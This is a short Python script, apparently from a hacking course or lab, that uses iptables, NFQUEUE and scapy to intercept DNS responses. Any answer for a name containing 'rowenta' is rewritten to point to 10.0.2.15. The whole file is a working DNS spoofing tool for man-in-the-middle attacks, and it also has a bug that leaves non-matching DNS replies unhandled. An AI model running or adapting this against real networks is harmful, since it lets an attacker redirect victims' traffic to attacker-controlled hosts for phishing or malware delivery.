#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy


def create_queue(id):
    # for testing in local machine call 2 times, and change de field FORWARD to: OUTPUT, INPUT
    # subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", id])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", id])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", id])
    print("Packets redirected to the queue with id: " + id)


def process_packet(packet):
    #print("ENTRA EN PROCESS PACKET")
    scapy_packet = scapy.IP(packet.get_payload())
    #print("pilla el payload")
    #if scapy_packet.haslayer(scapy.DNS):
    #    print(scapy_packet[scapy.DNSQR].qname)
    if scapy_packet.haslayer(scapy.DNSRR):
        print("IF 1")
       # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        print(qname)
        if "rowenta" in qname:
            #print("IF 2")
            print("[+] Spoofing target")
            response = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = response
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            print(scapy_packet.show())

            packet.set_payload(str(scapy_packet))
            print("VA A ACEPTAR EL PACKET")
            packet.accept()
            print("HA ACEPTADO EL PACKET")
    else:
        packet.accept()


try:
    # create the queue at the system
    create_queue("0")
    # create an instance of netfilterqueue object
    queue = netfilterqueue.NetfilterQueue()
    # connect this object with queue created in our system
    # set the process_packet as callback function
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C, restoring IP tables.")
    # to restore the ip tables: iptables -- flush
    subprocess.call(["iptables", "--flush"])